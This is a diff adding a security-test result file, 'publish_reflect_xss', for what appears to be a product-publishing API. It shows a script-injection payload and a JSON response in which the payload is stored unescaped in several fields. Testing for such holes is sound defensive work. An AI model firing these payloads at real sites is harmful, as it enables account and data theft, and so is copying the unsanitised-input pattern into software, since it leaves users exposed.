@@ -1,0 +1,9 @@
+TEST: publish_reflect_xss
+PAYLOAD: '<svg><script>alert(1)</script></svg>'
+STATUS: 201
+HEADERS:
+content-length: 186
+content-type: application/json
+
+BODY:
+{"name":"<svg><script>alert(1)</script></svg>","price":1.23,"description":"<svg><script>alert(1)</script></svg>","image_url":"<svg><script>alert(1)</script></svg>","id":26,"seller_id":1}
